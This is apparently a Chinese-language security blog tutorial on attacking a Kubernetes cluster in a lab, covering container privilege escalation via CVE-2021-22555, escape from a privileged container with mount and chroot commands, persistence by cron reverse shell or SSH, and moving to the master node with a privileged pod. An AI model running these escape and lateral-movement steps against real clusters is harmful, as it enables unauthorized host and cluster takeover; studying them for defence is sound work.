---
title: K8s 集群渗透
---

<center><h1>K8s 集群渗透</h1><b>本文作者：一生热爱</b><br><br></center>

---

## 一、k8s 集群架构

   <br>

<img width="900" src="/img/image-20220830153235077.png"></br>

   <br>

<img width="1000" src="/img/image-20220901163117536.png"></br>

## 二、渗透路线

* docker user shell
* docker root shell
* docker逃逸
* 内网横向

   <br>

<img width="1000" src="/img/image-20220830153415777.png"></br>

## 三、获取 docker root shell

目前获取到 docker 中的一个普通用户 shell

<br>

<img width="900" src="/img/image-20220830131033867.png"></br>

使用 CVE-2021-22555 提升至 root shell

<br>

<img width="800" src="/img/image-20220830131216079.png"></br>

## 四、docker 中横向

   <br>

<img width="900" src="/img/image-20220830131327570.png"></br>

使用扫描器等，可以访问运行中的 docker

查看 docker 中的一些服务、共享目录、挂载等

## 五、docker 逃逸

查看 `/proc/1/status`，发现此容器为特权容器

<br>

<img width="600" src="/img/image-20220830131547932.png"></br>

这里使用如下命令

````bash
mkdir /httpd_test
mount /dev/sda1 /httpd_test
chroot /httpd_test/
````

现在在使用 Kubernetes 等命令可以发现能够执行成功，证明已经逃逸出来了。

<br>

<img width="800" src="/img/image-20220830144327410.png"></br>

接下来就是写定时任务反弹 shell、写 ssh 等。

## 六、node 节点到 master 节点

上面已经获取到 node 节点 shell，因为生产环境的 docker、pod 与 k8s 一般不属于同一网段，现在获取到 node 节点权限就可以访问整个 k8s 集群网络了。

一般在 node 节点不能执行 k8s 命令，这里实验环境简易搭建一下。

首先通过如下命令，设置节点标号，然后清除 master 节点不能分配 pod

```bash
> kubectl label node k8s-master  type=node1
> kubectl taint nodes --all node-role.kubernetes.io/master-node "k8s" untainted
> kubectl describe node k8s | grep Taints
  Taints:             <none>
```

创建如下 nginx-pod.yaml 文件

```yaml
apiVersion: v1
kind: Pod                     # 类型为 Pod
metadata:	
  name: nginx-pod1            # Pod 的名称
  labels:
    app: nginxlabel
spec:
  nodeSelector:
    type: node1
  containers:                  # Pod 内容器的定义部分
    - name: nginx              # 容器对应的名称
      image: nginx             # 容器对应的 Docker 镜像
      ports:
        - containerPort: 80    # 容器应用监听的端口号
      securityContext:
        privileged: true
```

使用 `kubectl apply -f  nginx-pod.yaml` 在 master 创建 pod

   <br>

<img width="1000" src="/img/image-20220830150321495.png"></br>

使用如下命令，进入 pod

```bash
kubectl exec -it nginx-pod1 -- /bin/bash
```

   <br>

<img width="700" src="/img/image-20220830152628774.png"></br>

如上图所示已进入 master 节点，如下图所示也为特权模式启动的 docker 镜像。

   <br>

<img width="700" src="/img/image-20220830153036234.png"></br>

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年11月4日"
    }
  }
</script>



